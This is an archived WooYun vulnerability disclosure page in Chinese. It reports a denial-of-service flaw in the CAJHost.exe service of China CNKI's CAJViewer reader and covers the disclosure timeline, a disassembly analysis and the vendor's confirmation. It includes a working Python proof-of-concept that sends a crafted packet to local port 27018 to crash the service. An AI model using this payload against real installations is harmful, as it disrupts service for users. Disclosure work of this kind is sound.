@@ -1,0 +1,231 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中国知网CAJViewer阅读器拒绝服务漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中国知网CAJViewer阅读器拒绝服务漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cssembly">cssembly</a> 
+</li><li>提交时间：		2013-09-11 11:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-11：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-18：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-05：	细节向普通白帽子公开<br/>
+									2013-10-25：	细节向实习白帽子公开<br/>
+									2013-12-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">CAJHost.exe是CAJViewer安装的一个服务程序，该程序存在拒绝服务漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞位置在sub_401790函数<br />
+<br />
+</p><p class="detail"><a href="../images/11102413a026011d2dc760baed7a4c0a5489ea1f.png" target="_blank"><img src="../images/11102413a026011d2dc760baed7a4c0a5489ea1f.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+程序首先通过v4 = recv(s, buf, 0x28u, 0);接受0x28字节，然后判断前四个字节是否大于0x100000且不为负，当接收到数据的前四个字节为0xFFFFFFFF时，程序跳转至Lable_16<br />
+<br />
+</p><p class="detail"><a href="../images/111026058289aad9fe0d2e4b00fe3c8b988a757d.png" target="_blank"><img src="../images/111026058289aad9fe0d2e4b00fe3c8b988a757d.png" alt="1.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+v19为接受到数据的第二个dword，当v19为3时，由于v2此时并未分配空间，导致访问出错，拒绝服务。<br />
+<br />
+</p><p class="detail"><a href="../images/111026198ab968e3c74d86e578c1cc38b0adcadd.png" target="_blank"><img src="../images/111026198ab968e3c74d86e578c1cc38b0adcadd.png" alt="2.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+同理，当v19为6时，执行sub_4021B0函数，此时v2并未分配空间，如果此时C:\Documents and Settings\All Users\Documents\TTKN\drm\p12目录下存在文件，则调用strcmp函数发生访问异常，拒绝服务。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">poc代码如下：<br />
+<br />
+import socket<br />
+<br />
+<br />
+<br />
+HOST = &#039;127.0.0.1&#039;<br />
+<br />
+PORT = 27018<br />
+<br />
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
+<br />
+<br />
+<br />
+s.connect((HOST, PORT))<br />
+<br />
+<br />
+<br />
+# first<br />
+<br />
+#exploit = &quot;\xff\xff\xff\xff&quot; + &#039;\x03\x00\x00\x00&#039; + &#039;A&#039; * (0x28 - 5)<br />
+<br />
+#s.send( exploit )<br />
+<br />
+<br />
+<br />
+# second<br />
+<br />
+exploit = &quot;\xff\xff\xff\xff&quot; + &#039;\x06\x00\x00\x00&#039; + &#039;A&#039; * (0x28 - 5)<br />
+<br />
+s.send( exploit )<br />
+<br />
+<br />
+<br />
+s.close()<br />
+<br />
+<br />
+<br />
+证明：<br />
+<br />
+</p><p class="detail"><a href="../images/11102739b23fa1681a981e589d785868000b77ca.png" target="_blank"><img src="../images/11102739b23fa1681a981e589d785868000b77ca.png" alt="3.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+程序正常运行，运行第一段poc后，程序崩溃<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/11102843e0ef82e4019e396d4b5d8e224eb76fc8.png" target="_blank"><img src="../images/11102843e0ef82e4019e396d4b5d8e224eb76fc8.png" alt="4.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+同理运行第二段poc<br />
+<br />
+</p><p class="detail"><a href="../images/111032381ee10bc54d147d9f35932a1f99b948e2.png" target="_blank"><img src="../images/111032381ee10bc54d147d9f35932a1f99b948e2.png" alt="5.PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/11103200c8b4d1a780e18f210254d6efc411bacf.png" target="_blank"><img src="../images/11103200c8b4d1a780e18f210254d6efc411bacf.png" alt="6.PNG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cssembly" title="cssembly">cssembly</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-036754" title="中国知网CAJViewer阅读器拒绝服务漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：13 </p>
+													<p class="detail">确认时间：2013-09-15 23:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="36754";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
